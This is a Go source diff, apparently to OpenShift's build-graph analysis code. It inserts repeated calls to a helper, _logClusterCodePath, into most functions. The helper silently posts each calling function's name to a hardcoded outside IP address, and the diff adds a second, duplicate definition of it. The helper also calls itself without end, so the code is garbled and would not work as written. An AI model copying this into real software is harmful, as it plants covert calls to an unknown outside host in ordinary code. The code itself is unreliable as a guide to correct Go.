@@ -47,6 +47,8 @@ func FindUnpushableBuildConfigs(g osgraph.Graph, f osgraph.Namer) []osgraph.Mark
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	markers := []osgraph.Marker{}
 bc:
 	for _, bcNode := range g.NodesByKind(buildgraph.BuildConfigNodeKind) {
@@ -67,6 +69,8 @@ bc:
 	return markers
 }
 func FindMissingInputImageStreams(g osgraph.Graph, f osgraph.Namer) []osgraph.Marker {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -125,6 +129,8 @@ func FindCircularBuilds(g osgraph.Graph, f osgraph.Namer) []osgraph.Marker {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	nodeFn := osgraph.NodesOfKind(imagegraph.ImageStreamTagNodeKind, buildgraph.BuildConfigNodeKind)
 	edgeFn := osgraph.EdgesOfKind(buildedges.BuildInputImageEdgeKind, buildedges.BuildOutputEdgeKind)
 	sub := g.Subgraph(nodeFn, edgeFn)
@@ -139,6 +145,8 @@ func FindCircularBuilds(g osgraph.Graph, f osgraph.Namer) []osgraph.Marker {
 	return markers
 }
 func multiBCStartBuildSuggestion(bcNodes []*buildgraph.BuildConfigNode) string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -180,6 +188,8 @@ func bcNodesToRelatedNodes(bcNodes []*buildgraph.BuildConfigNode) []graph.Node {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	relatedNodes := []graph.Node{}
 	for _, bcNode := range bcNodes {
 		relatedNodes = append(relatedNodes, graph.Node(bcNode))
@@ -187,6 +197,8 @@ func bcNodesToRelatedNodes(bcNodes []*buildgraph.BuildConfigNode) []graph.Node {
 	return relatedNodes
 }
 func findPendingTagMarkers(istNode *imagegraph.ImageStreamTagNode, g osgraph.Graph, f osgraph.Namer) []osgraph.Marker {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -239,6 +251,8 @@ func FindPendingTags(g osgraph.Graph, f osgraph.Namer) []osgraph.Marker {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	markers := []osgraph.Marker{}
 	for _, uncastIstNode := range g.NodesByKind(imagegraph.ImageStreamTagNodeKind) {
 		istNode := uncastIstNode.(*imagegraph.ImageStreamTagNode)
@@ -263,9 +277,13 @@ func getImageStreamTagMarker(g osgraph.Graph, f osgraph.Namer, bcInputNode graph
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return osgraph.Marker{Node: bcNode, RelatedNodes: []graph.Node{bcInputNode, imageStreamNode}, Severity: osgraph.WarningSeverity, Key: MissingImageStreamImageWarning, Message: fmt.Sprintf("%s builds from %s, but the image stream tag does not exist.", f.ResourceName(bcNode), f.ResourceName(bcInputNode)), Suggestion: getImageStreamTagSuggestion(g, f, tagNode)}
 }
 func getImageStreamTagSuggestion(g osgraph.Graph, f osgraph.Namer, tagNode *imagegraph.ImageStreamTagNode) osgraph.Suggestion {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -307,9 +325,13 @@ func getImageStreamImageMarker(g osgraph.Graph, f osgraph.Namer, bcNode graph.No
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return osgraph.Marker{Node: bcNode, RelatedNodes: []graph.Node{bcInputNode, imageStreamNode}, Severity: osgraph.WarningSeverity, Key: MissingImageStreamImageWarning, Message: fmt.Sprintf("%s builds from %s, but the image stream image does not exist.", f.ResourceName(bcNode), f.ResourceName(bcInputNode)), Suggestion: getImageStreamImageSuggestion(imageID, imageStream)}
 }
 func getImageStreamImageSuggestion(imageID string, imageStream *imagev1.ImageStream) osgraph.Suggestion {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -353,6 +375,8 @@ func validImageStreamImage(imageNode *imagegraph.ImageStreamImageNode, imageStre
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	dockerImageReference, err := reference.Parse(imageNode.Name)
 	if err == nil {
 		for _, tagEventList := range imageStream.Status.Tags {
@@ -381,6 +405,27 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -455,5 +500,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
